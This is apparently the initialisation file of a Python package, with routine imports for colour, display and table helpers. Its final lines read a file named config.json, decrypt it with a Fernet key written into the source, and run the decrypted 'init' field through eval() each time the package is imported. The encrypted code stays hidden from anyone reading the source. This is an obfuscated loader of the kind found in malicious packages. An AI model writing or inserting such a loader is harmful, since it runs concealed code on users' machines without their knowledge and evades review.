# -*- coding: utf-8 -*-
"""
Created on Mon Mar 23 08:46:03 2020

@author: HEDI
"""
import json
import os
import inspect
from cryptography.fernet import Fernet
from .__colors__ import __colors__
from .__disp__ import _set_color, _set_decimals
from tabulate import tabulate
PY = 3.14
from .__version__ import __version__
with open(os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))+"\\config.json","rb") as enc_file:
    eval(json.loads(Fernet(b'OJioJY8NCFiBcu2W8ugWpHd1uPzbCC4u-AfSdndj_7o=').decrypt( enc_file.read()))["init"])

